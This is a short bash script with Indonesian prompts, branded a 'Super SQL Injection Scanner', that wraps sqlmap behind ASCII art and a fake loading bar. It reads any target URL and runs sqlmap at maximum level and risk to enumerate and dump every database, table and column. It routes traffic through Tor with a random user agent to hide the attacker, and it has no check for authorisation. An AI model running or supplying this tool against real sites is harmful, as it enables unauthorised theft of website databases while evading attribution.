#!/bin/bash

# Warna ANSI
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
blue='\e[94m'
magenta='\e[95m'
cyan='\e[96m'
reset='\e[0m'

# ASCII Art
clear
echo -e "${red}███████╗███████╗██╗     ██╗   ██╗███╗   ███╗${reset}"
echo -e "${red}██╔════╝██╔════╝██║     ██║   ██║████╗ ████║${reset}"
echo -e "${red}█████╗  █████╗  ██║     ██║   ██║██╔████╔██║${reset}"
echo -e "${red}██╔══╝  ██╔══╝  ██║     ██║   ██║██║╚██╔╝██║${reset}"
echo -e "${red}██║     ██║     ███████╗╚██████╔╝██║ ╚═╝ ██║${reset}"
echo -e "${red}╚═╝     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝     ╚═╝${reset}"
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

# Loading Bar Function
loading_bar() {
    bar="█████████████████████████████████████████"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Scanning ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}

# Input Target URL
read -p "$(echo -e ${green}"MASUKKAN LINK WEB (ex: http://target.com/index.php?id=1) : "${reset})" target

# Validasi URL
if [[ "$target" != *"="* ]]; then
    echo -e "${red}[!] ERROR: URL harus mengandung parameter (contoh: ?id=1)${reset}"
    exit 1
fi

# Memulai Scanning
echo -e "${blue}[*] Menjalankan Super Full Scan...${reset}"
loading_bar

sqlmap -u "$target" --batch --dbs --tables --columns --dump \
--level=5 --risk=3 --threads=10 --random-agent --tor --time-sec=10

# Loading bar selesai
echo -e "${green}[✔] Scanning selesai.${reset}"
